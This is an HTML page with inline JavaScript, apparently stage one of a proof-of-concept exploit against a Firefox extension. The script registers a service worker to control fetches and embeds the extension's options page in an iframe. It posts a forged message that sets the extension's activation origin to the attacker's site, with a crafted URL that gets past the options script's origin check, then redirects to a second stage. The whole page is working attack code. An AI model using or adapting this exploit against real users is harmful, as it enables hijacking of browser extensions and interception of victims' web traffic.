<!DOCTYPE html>
<html>
<head>
  <title>Stage 1 - Register SW & Hijack Config</title>
</head>
<body>
  <script>
    async function run() {
      // 1. Register the Service Worker to control network fetches on this scope
      const reg = await navigator.serviceWorker.register('/sw.js');
      await navigator.serviceWorker.ready;

      // 2. Open an iframe to the extension's web_accessible options page
      const iframe = document.createElement('iframe');
      iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
      document.body.appendChild(iframe);

      iframe.onload = () => {
        // 3. Post a message to set activateOn to our origin
        // Satisfies options.js check: href contains 'https://doc.rust-lang.org/'
        iframe.contentWindow.postMessage({
          activateOn: window.location.origin,
          href: 'https://doc.rust-lang.org/?bypass=1'
        }, '*');

        // 4. Navigate to Stage 2 after setting config
        setTimeout(() => {
          window.location.href = '/stage2.html?ref=https://doc.rust-lang.org/';
        }, 500);
      };
    }
    run();
  </script>
</body>
</html>
